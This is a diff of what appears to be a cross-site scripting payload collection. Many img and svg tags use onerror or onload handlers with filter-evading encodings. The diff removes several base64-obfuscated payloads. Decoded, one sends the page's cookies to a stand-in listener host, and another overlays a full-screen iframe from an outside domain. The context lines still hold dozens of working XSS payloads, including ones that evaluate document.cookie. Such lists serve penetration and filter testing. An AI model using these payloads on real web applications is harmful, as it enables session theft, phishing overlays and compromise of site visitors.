@@ -119,7 +119,7 @@
 "><image/src/onerror=prompt("ibrahimxss")>
 <image src =q onerror=prompt(8)>
 image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
-<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>
+<img%09'%0asrc='%5c%0d%7c'%00=''>
 <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
 <img[%09]onerror=alert(1) src=a>
 <img[%0a]onerror=alert(1) src=a>
@@ -169,7 +169,7 @@ IMG+LOWSRC="javascript:alert(1);">
 "/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
 <imgonerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1& #x29;&#x27;&#x29; src=a
 <img onfocus=alert(1) autofocus tabindex=1>	
-<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+<img >
 “><img only src=1 onerror=alert()>
 <IMG onmouseover="alert('xxs')">
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
@@ -551,7 +551,7 @@ javascript://</title></textarea></style></script --><li '//" '*/alert()/*', oncl
 "\"><img src=\"x\" onerror=\"confirm(0)\"/>",
 ><imgsrc=x onerror=confirm.onerror=confirm(1)>
 "><img src=x onerror=confirm('x') />]
-"><img src="x" onerror="document.write(document.write(eval(atob('JzxpZnJhbWUgc3JjPSJodHRwczovL2Nvay5raW0vP2VtYWlsPScrZG9jdW1lbnQudGl0bGUrJyIgc3R5bGU9ImJvcmRlcjogMDsgcG9zaXRpb246Zml4ZWQ7IHRvcDowOyBsZWZ0OjA7IHJpZ2h0OjA7IGJvdHRvbTowOyB3aWR0aDoxMDAlOyBoZWlnaHQ6MTAwJSI+Jw==')))" >
+"><img src="x"  >
 <img src=x onerror="eval('\141lert(1)')"/>
 "><img src=x onerror=eval('prompt(document.domain)')>
 <img src=x onerror="eval('\x61lert(1)')"/>
@@ -2304,8 +2304,8 @@ svg/onload=alert(document.cookie)abcdef@test.com
 "><svg onload="confirm(7)">
 <svg onload="confirm(7)">
 "<!--><Svg OnLoad=confirm?.(/coffin😈/)<!--1")"<!--><Svg+OnLoad=confirm?.(/coffin😈/)<!--
-<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
-<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
+<svg/>
+<svg/>
 <svg onload=eval(document.cookie)>
 <svg onload=eval(URL)>
 <svg onload=eval(window.name)>
